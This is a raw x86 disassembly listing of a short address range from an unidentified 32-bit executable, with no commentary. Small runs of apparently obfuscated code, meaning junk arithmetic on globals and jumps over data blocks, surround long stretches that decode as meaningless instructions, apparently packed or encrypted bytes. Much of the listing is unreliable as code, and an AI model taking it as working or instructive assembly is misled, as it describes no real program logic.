  420620:	movzx  ecx,WORD PTR ds:0x428293
  420627:	and    ecx,DWORD PTR ds:0x4283cb
  42062d:	mov    DWORD PTR ds:0x428293,ecx
  420633:	sub    ecx,edx
  420635:	mov    DWORD PTR [ebp-0xc0],0x3e2c
  42063f:	xor    DWORD PTR ds:0x4283df,0x275e
  420649:	mov    DWORD PTR [ebp-0x78],0x37f2
  420650:	sbb    ecx,0x6514
  420656:	mov    DWORD PTR [ebp-0x10],0x62ba
  42065d:	jmp    0x4209b9
  420662:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420663:	(bad)  
  420664:	mov    ?,ebx
  420666:	push   0x3a
  420668:	and    eax,0xe3891e9e
  42066d:	stos   BYTE PTR es:[edi],al
  42066e:	fcomp  DWORD PTR [ebp-0x2]
  420671:	mov    esi,0x18161dac
  420676:	mov    ds:0xc1181812,eax
  42067b:	push   eax
  42067c:	mov    bl,0xf8
  42067e:	mov    ds:0xfe38032d,eax
  420683:	hlt    
  420684:	xchg   edi,eax
  420685:	or     DWORD PTR [eax+edi*1-0x18],esp
  420689:	fwait
  42068a:	std    
  42068b:	sbb    eax,0x628d6ac3
  420690:	add    BYTE PTR [ecx-0x5],ah
  420693:	xor    BYTE PTR [eax+0x7b56af1b],0xd8
  42069a:	jae    0x420632
  42069c:	mov    eax,ebp
  42069e:	or     BYTE PTR [edi],dl
  4206a0:	xor    esi,DWORD PTR [ebp-0x4980038d]
  4206a6:	out    dx,eax
  4206a7:	jmp    0x420691
  4206a9:	xchg   ebp,eax
  4206aa:	lods   al,BYTE PTR ds:[esi]
  4206ab:	cmp    esi,edx
  4206ad:	imul   ebp,ebx,0x21897bd0
  4206b3:	popa   
  4206b4:	loopne 0x420705
  4206b6:	xchg   esi,eax
  4206b7:	clc    
  4206b8:	mov    ebp,0x73530ea5
  4206bd:	addr16 mov dh,0x59
  4206c0:	scas   eax,DWORD PTR es:[edi]
  4206c1:	sbb    DWORD PTR [edx-0xf98292d],ebx
  4206c7:	adc    al,0x14
  4206c9:	mov    bh,0x32
  4206cb:	out    dx,al
  4206cc:	icebp  
  4206cd:	add    DWORD PTR ds:0x93d70fc6,0x5bd40cd1
  4206d7:	inc    esi
  4206d8:	in     eax,0x5b
  4206da:	xor    eax,esp
  4206dc:	lea    edi,[esi]
  4206de:	or     BYTE PTR [ecx-0x10d00ec3],cl
  4206e4:	rcl    BYTE PTR [edi-0x3ad2aa1d],cl
  4206ea:	fst    DWORD PTR [esi-0xa]
  4206ed:	mov    esp,0x3f5d116
  4206f2:	sub    al,0x1
  4206f4:	sar    esi,1
  4206f6:	fstp   TBYTE PTR ds:0xbc2d3a56
  4206fc:	add    ecx,esp
  4206fe:	les    ecx,FWORD PTR [edi+eiz*2-0x5d]
  420702:	mov    ah,0x6d
  420704:	fwait
  420705:	shr    DWORD PTR [esi-0x678bed79],0x97
  42070c:	(bad)  
  42070d:	out    dx,eax
  42070e:	retf   
  42070f:	sub    DWORD PTR [edi],ecx
  420711:	fwait
  420712:	scas   al,BYTE PTR es:[edi]
  420713:	add    BYTE PTR [ebp+0x2d],cl
  420716:	cld    
  420717:	arpl   WORD PTR [ebp+0x3fd6a0bd],dx
  42071d:	clc    
  42071e:	xchg   ebx,eax
  42071f:	mov    ds:0xc1517315,eax
  420724:	(bad)
  420727:	(bad)  
  420728:	sahf   
  420729:	lods   eax,DWORD PTR ds:[esi]
  42072a:	jmp    0xa68c:0x46eed833
  420731:	xchg   edi,eax
  420732:	repz push edx
  420734:	imul   eax,DWORD PTR [edi+0xb],0xfffffffe
  420738:	dec    edx
  420739:	fwait
  42073a:	pop    ss
  42073b:	mov    esi,0xf6cae532
  420740:	icebp  
  420741:	imul   ebp,DWORD PTR [esi+0x5842d6ee],0x72b0997a
  42074b:	or     edi,ebx
  42074d:	ins    DWORD PTR es:[edi],dx
  42074e:	leave  
  42074f:	mov    ?,WORD PTR [edx]
  420751:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420752:	cmp    dl,BYTE PTR [esi]
  420754:	xor    DWORD PTR [ecx],esi
  420756:	rol    DWORD PTR [ebp+edi*1-0x5ffd5bdc],cl
  42075d:	adc    eax,0x14559f60
  420762:	push   eax
  420763:	repnz add eax,0x27ccf69a
  420769:	ja     0x42072a
  42076b:	cmp    ah,ah
  42076d:	test   eax,0xd406e240
  420772:	push   esi
  420773:	cmp    ch,dh
  420775:	mov    eax,0xd77d4843
  42077a:	or     eax,0xa4b36f80
  42077f:	xchg   bl,ch
  420781:	sbb    DWORD PTR [esi-0x42],edx
  420784:	rcr    DWORD PTR [edx+0x38001b30],0x29
  42078b:	and    BYTE PTR [edx+edx*4],0xa1
  42078f:	loop   0x420789
  420791:	mov    esp,0x63587ab
  420796:	or     BYTE PTR [ebx-0x44],cl
  420799:	aam    0xb0
  42079b:	fwait
  42079c:	pusha  
  42079d:	lock and ecx,ebp
  4207a0:	mov    DWORD PTR [esi],0xd8a510c
  4207a6:	fisub  DWORD PTR [esp+esi*1]
  4207a9:	mov    ds:0x4afeaad0,al
  4207ae:	gs pushf 
  4207b0:	adc    al,ch
  4207b2:	shr    esp,0x23
  4207b5:	popa   
  4207b6:	mov    BYTE PTR [ebx],ch
  4207b8:	mov    DWORD PTR [ecx],ebx
  4207ba:	xlat   BYTE PTR ds:[ebx]
  4207bb:	icebp  
  4207bc:	(bad)  
  4207bd:	sti    
  4207be:	cwde   
  4207bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4207c0:	xchg   edi,eax
  4207c1:	outs   dx,DWORD PTR ds:[esi]
  4207c2:	jmp    0xb606:0x49550ff9
  4207c9:	push   ecx
  4207ca:	loopne 0x420797
  4207cc:	lods   al,BYTE PTR ds:[esi]
  4207cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4207ce:	loopne 0x420812
  4207d0:	jo     0x42082a
  4207d2:	fs sbb al,0x52
  4207d5:	nop
  4207d6:	iret   
  4207d7:	pop    ss
  4207d8:	shl    WORD PTR [ebx],cl
  4207db:	xor    eax,0x59812c24
  4207e0:	pop    esp
  4207e1:	cmp    eax,0xd5a410fa
  4207e6:	jmp    0x27d516ef
  4207eb:	shl    DWORD PTR [esi+0x1010b76d],0xe2
  4207f2:	xchg   edx,eax
  4207f3:	ins    DWORD PTR es:[edi],dx
  4207f4:	xor    ebp,DWORD PTR [ecx+0xebf0057]
  4207fa:	inc    esp
  4207fb:	mov    ecx,DWORD PTR [edi]
  4207fd:	retw   0x48fe
  420801:	push   ecx
  420802:	das    
  420803:	retf   
  420804:	add    al,0xc3
  420806:	cmp    DWORD PTR [edx],edi
  420808:	lods   eax,DWORD PTR ds:[esi]
  420809:	mov    ds:0x9c3e5470,al
  42080e:	aaa    
  42080f:	jl     0x4207e6
  420811:	ror    DWORD PTR [edi-0x80],1
  420814:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420815:	int3   
  420816:	or     bh,al
  420818:	mov    dl,BYTE PTR [edi]
  42081a:	jl     0x420851
  42081c:	push   ebx
  42081d:	scas   eax,DWORD PTR es:[edi]
  42081e:	lods   eax,DWORD PTR ds:[esi]
  42081f:	scas   eax,DWORD PTR es:[edi]
  420820:	sub    DWORD PTR [ecx-0x6b],esp
  420823:	push   esp
  420824:	mov    bh,0xb5
  420826:	pop    es
  420827:	jo     0x420872
  420829:	mov    esi,0x670d402d
  42082e:	mov    al,ds:0x58bdebe3
  420833:	scas   al,BYTE PTR es:[edi]
  420834:	or     al,0x2a
  420836:	and    edi,DWORD PTR [edx-0x590c5428]
  42083c:	pusha  
  42083d:	xor    bl,ah
  42083f:	pop    ebp
  420840:	adc    ebp,esi
  420842:	inc    ebp
  420843:	es or  dl,cl
  420846:	inc    ebx
  420847:	stc    
  420848:	push   edx
  420849:	push   esp
  42084a:	jmp    0xa5ad2fba
  42084f:	aam    0xf0
  420851:	jmp    0xc4d3:0xff87b05
  420858:	aas    
  420859:	xor    al,0x5c
  42085b:	(bad)  
  42085c:	jns    0x42087d
  42085e:	jnp    0x4207fb
  420860:	cmp    esi,DWORD PTR [ebp+0xafd4894]
  420866:	jb     0x42082f
  420868:	leave  
  420869:	fnsave [eax+0x7522f556]
  42086f:	cmp    bh,BYTE PTR [esi-0x3a17cde4]
  420875:	adc    al,0xd2
  420878:	sbb    bl,BYTE PTR [ecx]
  42087a:	pop    esp
  42087b:	sbb    dh,BYTE PTR [eax]
  42087d:	ret    0x262a
  420880:	mov    edx,edi
  420882:	popa   
  420883:	outs   dx,BYTE PTR ds:[esi]
  420884:	add    esi,ebx
  420886:	repz cld 
  420888:	les    esi,FWORD PTR [ebp+0x5ec83354]
  42088e:	(bad)  
  42088f:	xor    dh,cl
  420891:	push   edi
  420892:	add    dl,BYTE PTR [edx]
  420894:	ret    
  420895:	(bad)  
  420896:	sbb    dh,dl
  420898:	xchg   ebp,eax
  420899:	enter  0x81f5,0x54
  42089d:	dec    esp
  42089e:	pop    eax
  42089f:	push   edx
  4208a0:	retf   0xea7a
  4208a3:	icebp  
  4208a4:	lea    ebx,[ecx+0x3b]
  4208a7:	mov    DWORD PTR [edi+0x32a18851],ecx
  4208ad:	lods   eax,DWORD PTR ds:[esi]
  4208ae:	adc    ch,ch
  4208b0:	lahf   
  4208b1:	jl     0x42091e
  4208b3:	call   0x575997ee
  4208b8:	shl    eax,cl
  4208ba:	in     al,0xc
  4208bc:	in     al,0x37
  4208be:	push   0xdbdf8bd9
  4208c3:	jmp    0x42093f
  4208c5:	mov    cl,0x65
  4208c7:	or     ebx,DWORD PTR [esi]
  4208c9:	pusha  
  4208ca:	xlat   BYTE PTR ds:[ebx]
  4208cb:	test   ch,dh
  4208cd:	mov    edi,fs
  4208cf:	sbb    DWORD PTR [bp+si-0xb],ebx
  4208d3:	or     BYTE PTR [esi+0x402eee],cl
  4208d9:	push   es
  4208da:	xor    ah,BYTE PTR [eax-0x7ce21beb]
  4208e0:	cmp    BYTE PTR [esi+ebx*4],cl
  4208e3:	add    DWORD PTR [esi-0xc],eax
  4208e6:	push   0x4aa79b88
  4208eb:	cs jns 0x42091c
  4208ee:	mov    ebx,0x6bb8052f
  4208f3:	sub    esi,DWORD PTR [ecx]
  4208f5:	adc    ebp,DWORD PTR [eax-0x24]
  4208f8:	add    dh,ah
  4208fa:	dec    esi
  4208fb:	push   es
  4208fc:	pop    es
  4208fd:	jns    0x420921
  4208ff:	sub    ah,BYTE PTR [esi]
  420901:	cmp    BYTE PTR [ecx-0x5fbd06ff],cl
  420907:	sbb    cl,BYTE PTR [ecx+0xfe05cca]
  42090d:	push   ebx
  42090e:	and    eax,0x54ee51cc
  420913:	ss int 0x12
  420916:	out    0x80,al
  420918:	dec    edi
  420919:	pusha  
  42091a:	dec    ebx
  42091b:	mov    ebx,DWORD PTR [si+0x6]
  42091f:	loope  0x420949
  420921:	mov    esp,0x2d90cf9e
  420926:	gs and al,0xc5
  420929:	sbb    al,0xc7
  42092b:	test   BYTE PTR [eax-0x23a345a1],al
  420931:	pmaxub mm1,QWORD PTR [eax+0x182a8fc1]
  420938:	popf   
  420939:	repnz test DWORD PTR [edx],0xda79e6e3
  420940:	and    edi,DWORD PTR [ecx-0x7d]
  420943:	adc    DWORD PTR [edx+0x297a6c9b],ebp
  420949:	ret    0x3af9
  42094c:	retf   
  42094d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42094e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42094f:	mov    bh,BYTE PTR [ebp-0x487265d9]
  420955:	push   ebx
  420956:	jmp    FWORD PTR [ecx-0x69]
  420959:	mov    ds:0xa9e994e,al
  42095e:	push   esi
  42095f:	jmp    0x24590684
  420964:	sub    eax,0xf893468b
  420969:	in     eax,0x12
  42096b:	cmp    DWORD PTR [eax-0x18302e43],ebp
  420971:	or     al,0x3a
  420973:	or     edi,esi
  420975:	shr    DWORD PTR [edx+0x46],cl
  420978:	call   0x7008:0x2718df3c
  42097f:	(bad)  
  420980:	jp     0x420910
  420982:	jmp    0x4209c8
  420984:	push   ds
  420985:	cmc    
  420986:	mov    dl,BYTE PTR [ebx-0x65]
  420989:	in     eax,dx
  42098a:	fmul   DWORD PTR [esi+ebx*8+0x5e]
  42098e:	adc    DWORD PTR [ebx+0xa],ecx
  420991:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420992:	add    al,0x6c
  420994:	outs   dx,DWORD PTR ds:[esi]
  420995:	xor    DWORD PTR [ebx],ebx
  420997:	sbb    al,0x8f
  420999:	xor    al,0x68
  42099b:	sti    
  42099c:	test   al,0xc5
  42099e:	cmp    edi,DWORD PTR [eax]
  4209a0:	add    al,0x57
  4209a2:	addr16 enter 0x4662,0x6c
  4209a7:	ins    DWORD PTR es:[edi],dx
  4209a8:	cmp    eax,0xe826b47b
  4209ad:	stos   DWORD PTR es:[edi],eax
  4209ae:	repz adc al,0x45
  4209b1:	mov    edx,0x8e823ef7
  4209b6:	(bad)  
  4209b7:	pop    esp
  4209b8:	(bad)  
  4209ba:	test   DWORD PTR [edi+edi*8-0x1],ebp
  4209be:	call   FWORD PTR [esi+edx*2]
  4209c1:	add    BYTE PTR [eax],al
  4209c3:	mov    DWORD PTR [ebp-0x34],0x58bc
  4209ca:	mov    DWORD PTR [ebp-0x60],0x24c7
  4209d1:	xor    eax,DWORD PTR ds:0x4282a3
  4209d7:	mov    DWORD PTR [ebp-0x5c],0x7a45
  4209de:	xor    DWORD PTR ds:0x42833f,0x80d
  4209e8:	mov    eax,DWORD PTR [ebp-0x34]
  4209eb:	cmp    DWORD PTR ds:0x428367,0x0
  4209f2:	movzx  esi,WORD PTR ds:0x42827f
  4209f9:	mov    ecx,0x4d8b
  4209fe:	jmp    0x420a54
  420a03:	mov    DWORD PTR ds:0x4281ab,0x6139
  420a0d:	mov    DWORD PTR ds:0x4283e3,0x3849
  420a17:	cmp    DWORD PTR ds:0x428367,0x0
  420a1e:	jne    0x420a40
  420a24:	push   0x53aa
  420a29:	push   0x7054
  420a2e:	call   DWORD PTR ds:0x428e90
  420a34:	sub    DWORD PTR ds:0x42833b,0xc6b
  420a3e:	inc    esi
  420a3f:	inc    edx
  420a40:	and    DWORD PTR ds:0x42826f,edi
  420a46:	and    edx,0x7a3f
  420a4c:	sbb    ecx,ecx
  420a4e:	and    esi,0x2474
  420a54:	mov    ecx,DWORD PTR [ebp-0x60]
  420a57:	adc    edx,DWORD PTR ds:0x4282cb
  420a5d:	mov    edx,DWORD PTR [ebp-0x5c]
  420a60:	mov    esi,DWORD PTR ds:0x42833b
  420a66:	sub    DWORD PTR ds:0x42834f,esi
  420a6c:	and    edx,0x160e
  420a72:	add    esi,DWORD PTR ds:0x4281af
  420a78:	sub    edx,ecx
  420a7a:	cmp    DWORD PTR ds:0x4282c3,0x0
  420a81:	mov    DWORD PTR ds:0x42832b,ecx
  420a87:	mov    esi,DWORD PTR ds:0x428363
  420a8d:	jmp    0x420e58
  420a92:	mov    DWORD PTR ds:0x4282ab,0x7aef
  420a9c:	cmp    DWORD PTR ds:0x4282c3,0x0
  420aa3:	je     0x420adc
  420aa9:	push   DWORD PTR [ebp-0x18]
  420aac:	push   0x4599
  420ab1:	push   DWORD PTR [ebp-0x14]
  420ab4:	push   DWORD PTR [ebp-0x10]
  420ab7:	call   DWORD PTR ds:0x428e94
  420abd:	mov    esi,DWORD PTR ds:0x4283ab
  420ac3:	or     DWORD PTR ds:0x4282d3,esi
  420ac9:	xor    ecx,ecx
  420acb:	add    ecx,DWORD PTR ds:0x4281e3
  420ad1:	mov    esi,DWORD PTR ds:0x428427
  420ad7:	sub    ecx,esi
  420ad9:	or     ecx,DWORD PTR [ecx+esi*1]
  420adc:	mov    esi,DWORD PTR ds:0x4281ab
  420ae2:	or     DWORD PTR ds:0x4282d3,esi
  420ae8:	add    ecx,0x4e9b
  420aee:	sbb    esi,ecx
  420af0:	sub    DWORD PTR ds:0x428333,ecx
  420af6:	or     esi,0x56f6
  420afc:	jmp    0x420e58
  420b01:	mov    bl,0xa9
  420b03:	lds    esp,FWORD PTR [edx-0x574d5d3d]
  420b09:	stos   BYTE PTR es:[edi],al
  420b0a:	xor    BYTE PTR [edi+0x7c],0xf1
  420b0e:	rol    ecx,1
  420b10:	mov    al,0x36
  420b12:	pop    ss
  420b13:	push   ss
  420b14:	sbb    BYTE PTR [ebx+0x20181812],ah
  420b1a:	add    BYTE PTR [ecx+esi*1+0x30b93e9d],ch
  420b21:	jns    0x420ad2
  420b23:	mov    ah,0x75
  420b25:	pop    ebx
  420b26:	jecxz  0x420b3c
  420b28:	and    BYTE PTR [eax+0x7d3a18b0],0xd3
  420b2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b30:	call   0x2725:0x39c2e7dc
  420b37:	lock jle 0x420b27
  420b3a:	js     0x420b3e
  420b3c:	add    eax,0x6307764e
  420b41:	jo     0x420ad5
  420b43:	jp     0x420b55
  420b45:	jne    0x420b92
  420b47:	or     BYTE PTR [ebx+0x6d82d1ce],al
  420b4d:	add    DWORD PTR [ecx+0x6ff24788],ebx
  420b53:	pop    esi
  420b54:	ret    0xa12b
  420b57:	inc    ecx
  420b58:	jl     0x420b30
  420b5a:	shr    BYTE PTR [ecx-0x3833845e],cl
  420b60:	xor    ch,BYTE PTR [ecx-0x19184334]
  420b66:	pushf  
  420b67:	jle    0x420b3d
  420b69:	ins    DWORD PTR es:[edi],dx
  420b6a:	cmp    ah,ch
  420b6c:	pop    esi
  420b6d:	ret    0xba14
  420b70:	mov    ebp,0x30c0a854
  420b75:	push   eax
  420b76:	and    bl,BYTE PTR [edx]
  420b78:	leave  
  420b79:	xor    edx,DWORD PTR [edx+edx*4]
  420b7c:	leave  
  420b7d:	push   eax
  420b7e:	xchg   BYTE PTR [ebx],dh
  420b80:	xchg   ecx,eax
  420b81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b82:	fstp   TBYTE PTR [eax-0x588d8275]
  420b88:	and    bl,BYTE PTR [ebx+0x2747eea8]
  420b8e:	shr    DWORD PTR [edi-0x18],cl
  420b91:	push   edx
  420b92:	pop    ebx
  420b93:	inc    ebp
  420b94:	mov    bh,0x24
  420b96:	(bad)  
  420b98:	(bad)  
  420b99:	jp     0x420be8
  420b9b:	inc    edi
  420b9c:	jae    0x420b30
  420b9e:	test   DWORD PTR [edi],esp
  420ba0:	xor    esp,0x11
  420ba3:	jno    0x420bde
  420ba5:	pop    esp
  420ba6:	jg     0x420bef
  420ba8:	pop    ecx
  420ba9:	inc    edi
  420baa:	loope  0x420c19
  420bac:	push   ebp
  420bad:	sbb    eax,ebx
  420baf:	xchg   ebx,eax
  420bb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420bb1:	inc    ebx
  420bb2:	call   0x20660f7f
  420bb7:	mov    BYTE PTR [ecx-0xa],ch
  420bba:	sub    DWORD PTR [edi-0x64],0xfffffff4
  420bbe:	push   ds
  420bbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420bc0:	jnp    0x420bcd
  420bc2:	cmp    DWORD PTR [esi-0x6c4eb65b],esp
  420bc8:	sti    
  420bc9:	and    eax,0xcb0b99a1
  420bce:	push   es
  420bcf:	(bad)  
  420bd0:	stc    
  420bd1:	adc    cl,BYTE PTR [esi]
  420bd3:	pop    es
  420bd4:	or     BYTE PTR [edi],bl
  420bd6:	xor    BYTE PTR [esi],cl
  420bd8:	cwde   
  420bd9:	mov    eax,0x42f778a6
  420bde:	push   cs
  420bdf:	inc    eax
  420be0:	cwde   
  420be1:	arpl   WORD PTR [ebp+0x5f],cx
  420be4:	push   ds
  420be5:	hlt    
  420be6:	popa   
  420be7:	stos   DWORD PTR es:[edi],eax
  420be8:	psubsb mm1,QWORD PTR [edi+esi*4]
  420bec:	cmp    DWORD PTR [ecx],esi
  420bee:	pop    edx
  420bef:	pop    edi
  420bf0:	pushf  
  420bf1:	jb     0x420bcf
  420bf3:	loop   0x420bc3
  420bf5:	adc    ebp,DWORD PTR [edx-0x3f29da5]
  420bfb:	jae    0x420ba5
  420bfd:	mov    dh,0xd0
  420bff:	inc    DWORD PTR [ecx+0xc7d318d]
  420c05:	pop    edi
  420c06:	dec    esp
  420c07:	mov    ah,0x1e
  420c09:	rcl    DWORD PTR [edx],1
  420c0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c0c:	stos   BYTE PTR es:[edi],al
  420c0d:	das    
  420c0e:	cmp    bh,BYTE PTR [ebx-0x6e1555f3]
  420c14:	in     eax,0xbc
  420c16:	push   0xbee3b175
  420c1b:	or     bh,BYTE PTR ds:0x724e62c4
  420c21:	addr16 jns 0x420c3c
  420c24:	cmp    dl,al
  420c26:	mov    ds:0x8e88849e,al
  420c2b:	inc    eax
  420c2d:	inc    esi
  420c2e:	sub    BYTE PTR [edi],dl
  420c30:	sub    ch,BYTE PTR [eax]
  420c32:	push   esi
  420c33:	imul   ebp,DWORD PTR [ebx+0x727f291e],0xffffffc7
  420c3a:	pop    ebx
  420c3b:	dec    esi
  420c3c:	outs   dx,BYTE PTR ds:[esi]
  420c3d:	xor    al,0x75
  420c3f:	sahf   
  420c40:	pop    ss
  420c41:	mov    eax,0xba880f3e
  420c46:	or     DWORD PTR [ebx-0x3b7ea7e6],ecx
  420c4c:	xchg   edx,eax
  420c4d:	adc    dl,BYTE PTR [edx]
  420c4f:	cmp    al,0x3a
  420c51:	xor    BYTE PTR [esi-0x4788ef78],0x11
  420c58:	xor    eax,0x82f79a7d
  420c5d:	xlat   BYTE PTR ds:[ebx]
  420c5e:	mov    al,ds:0xf3a54622
  420c63:	ret    
  420c64:	pushf  
  420c65:	inc    esi
  420c66:	and    DWORD PTR ds:0xcf0fde91,ebp
  420c6c:	mov    cl,0x48
  420c6e:	add    al,0xfa
  420c70:	fcmovne st,st(3)
  420c72:	popa   
  420c73:	dec    esp
  420c74:	jnp    0x420c2f
  420c76:	dec    edi
  420c77:	in     al,0x11
  420c79:	mov    esi,DWORD PTR [edi-0x5a]
  420c7c:	leave  
  420c7d:	scas   al,BYTE PTR es:[edi]
  420c7e:	adc    al,BYTE PTR [ecx]
  420c80:	fcom   QWORD PTR [edx+edx*4+0x58]
  420c84:	add    BYTE PTR [ecx+0x7f29e831],dh
  420c8a:	xor    DWORD PTR [ecx+0x2e7b1afe],ebp
  420c90:	mov    ds:0x5eacfc9f,eax
  420c95:	mov    bh,0x46
  420c97:	mov    ebp,0xdd8c622a
  420c9c:	push   cs
  420c9d:	shl    BYTE PTR [ebx+0x40],0x81
  420ca1:	dec    ecx
  420ca2:	sbb    ecx,ebp
  420ca4:	and    ch,BYTE PTR [edi]
  420ca6:	ret    0x5e4d
  420ca9:	adc    eax,0xd4863950
  420cae:	push   cs
  420caf:	leave  
  420cb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420cb1:	cmp    BYTE PTR [ebx],ah
  420cb3:	xchg   ecx,eax
  420cb4:	daa    
  420cb5:	rcr    BYTE PTR ds:0x9a416749,1
  420cbb:	out    dx,eax
  420cbc:	xchg   ebp,eax
  420cbd:	mov    esi,0x5fde2ad8
  420cc2:	mov    edi,0xfd57a396
  420cc7:	loop   0x420c52
  420cc9:	es pop ss
  420ccb:	sbb    DWORD PTR [edi],edi
  420ccd:	rcr    al,0x21
  420cd0:	int    0xcb
  420cd2:	add    dl,BYTE PTR [ebx]
  420cd4:	sub    eax,DWORD PTR [ecx]
  420cd6:	cli    
  420cd7:	retf   0x1443
  420cda:	jns    0x420d38
  420cdc:	add    esi,DWORD PTR [edx+0x3a98d05f]
  420ce2:	push   edi
  420ce3:	ret    
  420ce4:	jae    0x420d20
  420ce6:	sub    al,0x16
  420ce8:	inc    eax
  420ce9:	jb     0x420d55
  420ceb:	xchg   esp,eax
  420cec:	adc    BYTE PTR [edi+0x75],cl
  420cef:	push   0xe4c59a48
  420cf4:	jo     0x420d4a
  420cf6:	xor    dh,BYTE PTR ds:[ebx+0x2b2f3066]
  420cfd:	and    DWORD PTR [ebx],esi
  420cff:	sbb    eax,0x77a2071f
  420d04:	pop    eax
  420d05:	sub    BYTE PTR [edx+0x6c],bh
  420d08:	ds add al,0xbf
  420d0b:	ret    0x4f39
  420d0e:	scas   eax,DWORD PTR es:[edi]
  420d0f:	mov    cl,0x69
  420d11:	lds    esi,FWORD PTR [ecx]
  420d13:	sub    eax,0xd3af285e
  420d18:	fnsave [ebp+0x46]
  420d1b:	adc    BYTE PTR [ebx+0x3029bed7],0x9d
  420d22:	or     ebx,0xffffff89
  420d25:	jle    0x420cfb
  420d27:	pop    eax
  420d28:	push   0x7be7daec
  420d2d:	stc    
  420d2e:	ret    0x23c4
  420d31:	lahf   
  420d32:	xchg   ebx,eax
  420d33:	mov    ebx,0xd4378571
  420d38:	cmp    cl,BYTE PTR [edx-0x29986868]
  420d3e:	jg     0x420d07
  420d40:	mov    cl,0x28
  420d42:	lahf   
  420d43:	lock and al,BYTE PTR fs:[esi+ebx*2-0x4222ec84]
  420d4c:	jecxz  0x420d65
  420d4e:	sbb    ah,al
  420d50:	cli    
  420d51:	xor    eax,0x36fea93c
  420d56:	inc    edx
  420d57:	push   es
  420d58:	in     eax,dx
  420d59:	popa   
  420d5a:	nop
  420d5b:	popf   
  420d5c:	jb     0x420d0d
  420d5e:	enter  0xf16d,0xec
  420d62:	xor    DWORD PTR [edx+0x67c98990],eax
  420d68:	mov    ds:0xf106435d,al
  420d6d:	pop    ss
  420d6e:	call   FWORD PTR [ebp+0x72]
  420d71:	jg     0x420de4
  420d73:	test   DWORD PTR [ecx-0x59],ebx
  420d76:	mov    DWORD PTR [ecx-0x111901e5],ebp
  420d7c:	(bad)  
  420d7d:	rol    BYTE PTR [ebp-0x4b],cl
  420d80:	lods   al,BYTE PTR ds:[esi]
  420d81:	cmp    al,0x8b
  420d83:	test   al,0x6a
  420d85:	mov    ch,0xdb
  420d87:	mov    WORD PTR [ecx],ds
  420d89:	jmp    0x6444:0xa3fd5ac3
  420d90:	out    0xc3,eax
  420d92:	mov    WORD PTR [ebx+0x3e7e11be],ss
  420d98:	out    0x5,eax
  420d9a:	test   al,0x84
  420d9c:	xchg   ebp,eax
  420d9d:	or     DWORD PTR [ecx-0x5b6a4a],esp
  420da3:	push   ebp
  420da4:	fnstenv [esi-0x7e5350bb]
  420daa:	in     al,dx
  420dab:	xchg   esi,eax
  420dac:	jl     0x420e19
  420dae:	jle    0x420da6
  420db0:	and    al,0xcd
  420db2:	call   0x11eecda8
  420db7:	xchg   esi,eax
  420db8:	bound  ebx,QWORD PTR ds:0x476cc7f1
  420dbe:	mov    ?,WORD PTR [ecx-0x66]
  420dc1:	test   BYTE PTR [eax-0x74],dh
  420dc4:	mov    cl,0x80
  420dc6:	and    eax,0x941d166f
  420dcb:	inc    ecx
  420dcc:	(bad)  
  420dcd:	pusha  
  420dce:	lds    edi,FWORD PTR [edx]
  420dd0:	not    DWORD PTR [edi+ebp*4]
  420dd3:	xor    BYTE PTR [esi+0x29ee08a7],cl
  420dd9:	push   edi
  420dda:	jecxz  0x420dda
  420ddc:	out    0xd9,eax
  420dde:	push   esi
  420ddf:	cmp    BYTE PTR [eax],bl
  420de1:	rol    DWORD PTR [ebx-0x6df335da],cl
  420de7:	pop    edx
  420de8:	push   0xffffffca
  420dea:	sets   BYTE PTR [ebx-0x4bf00794]
  420df1:	pusha  
  420df2:	hlt    
  420df3:	(bad)  
  420df4:	addr16 dec edi
  420df6:	inc    esi
  420df7:	imul   esp,DWORD PTR [ebp+0x45e23cf2],0xe7242d53
  420e01:	jbe    0x420e3f
  420e03:	aaa    
  420e04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420e06:	jp     0x420e5b
  420e08:	mov    esp,0xb83bccf6
  420e0d:	adc    esp,DWORD PTR [edi]
  420e0f:	xlat   BYTE PTR ds:[ebx]
  420e10:	xchg   ebp,eax
  420e11:	jo     0x420e69
  420e13:	sbb    BYTE PTR [edx-0x6b89f26b],dl
  420e19:	xchg   edi,eax
  420e1a:	inc    edx
  420e1b:	loopne 0x420ddc
  420e1d:	xchg   edx,eax
  420e1e:	ins    DWORD PTR es:[edi],dx
  420e1f:	dec    ecx
  420e20:	adc    al,0x22
  420e22:	inc    edi
  420e23:	clc    
  420e24:	xor    al,0xf
  420e26:	cmp    DWORD PTR [ebp-0x809b2b7],ecx
  420e2c:	inc    BYTE PTR [edx-0x70]
  420e2f:	cwde   
  420e30:	fbld   TBYTE PTR [ebp-0x3bbb1aba]
  420e36:	fnsave [eax+0x5fd55d7d]
  420e3c:	jne    0x420e5b
  420e3e:	cmovae edi,DWORD PTR [ebp-0x369aa44c]
  420e45:	pop    esp
  420e46:	mov    ebx,0x78f70c77
  420e4b:	inc    eax
  420e4c:	pop    eax
  420e4d:	imul   edi,DWORD PTR [esi+0x7f],0x35
  420e51:	xchg   esp,eax
  420e52:	(bad)  [ecx-0x32]
  420e55:	out    dx,eax
  420e56:	xchg   edi,eax
  420e57:	jne    0x420dda
  420e59:	jmp    0x358b:0x29ad
  420e60:	retf   
  420e61:	add    DWORD PTR [edx+0x0],0x83bf3519
  420e68:	inc    edx
  420e69:	add    BYTE PTR [edi],cl
  420e6b:	scas   eax,DWORD PTR es:[edi]
  420e6c:	rol    BYTE PTR [ebx+0x4283db3d],1
  420e72:	add    BYTE PTR [eax],al
  420e74:	mov    DWORD PTR ds:0x428293,ebx
  420e7a:	mov    DWORD PTR ds:0x4281cb,0x153
  420e84:	jmp    0x420efa
  420e89:	mov    eax,ds:0x4281bf
